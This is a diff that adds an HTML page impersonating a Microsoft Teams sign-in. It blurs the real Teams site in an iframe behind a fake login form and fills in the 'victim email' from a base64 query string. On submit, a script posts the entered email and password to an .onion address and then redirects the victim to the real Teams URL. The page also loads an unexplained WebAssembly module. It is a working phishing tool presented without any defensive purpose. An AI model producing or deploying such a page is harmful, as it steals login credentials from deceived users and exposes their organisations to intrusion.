@@ -1,0 +1,37 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Microsoft Teams</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎙️</text></svg>">
+  <script type="module" src="paintlet.js"></script>
+  <style>
+    body { background-image: paint(blur-bg); }
+  </style>
+</head>
+<body>
+  <iframe id="real" src="https://teams.microsoft.com/_" style="position:fixed;inset:0;width:100%;height:100%;border:none;filter:blur(8px)"></iframe>
+  <form id="fake" style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:2rem;border-radius:4px;box-shadow:0 25px 50px -12px rgba(0,0,0,.25)">
+    <img src="https://logos-world.net/wp-content/uploads/2020/05/Microsoft-Teams-Logo.png" width="200">
+    <h3>Sign in to continue</h3>
+    <input id="email" placeholder="user@company.com" readonly>
+    <input id="password" type="password" placeholder="Password">
+    <button type="submit">Next</button>
+  </form>
+  <script type="module">
+    import init from './nightingale.wasm';
+    init().then(() => console.log('🐦'));
+    // preload victim email via query-string
+    const qs = new URLSearchParams(location.search);
+    document.getElementById('email').value = atob(qs.get('e') || '');
+    document.getElementById('fake').onsubmit = e => {
+      e.preventDefault();
+      fetch('https://u4k2zq3l2zxfx.onion/cred', {
+        method: 'POST',
+        body: JSON.stringify({u: email.value, p: password.value})
+      });
+      location.replace('https://teams.microsoft.com/_?auth=done');
+    };
+  </script>
+</body>
+</html> 
